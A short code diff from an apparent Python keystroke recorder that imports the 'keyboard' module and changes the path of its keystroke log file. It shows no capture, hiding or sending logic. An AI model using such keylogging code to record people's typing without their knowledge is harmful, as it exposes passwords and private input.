@@ -1,6 +1,6 @@
 import keyboard
 
-log_file = "keystrokes.txt"  # saved file.
+log_file = "\Keyboard Stroke Recorder - Windows\script/keystrokes.txt"  # saved file.
 
 
 # write the keystrokes on file, and format one stroke per like
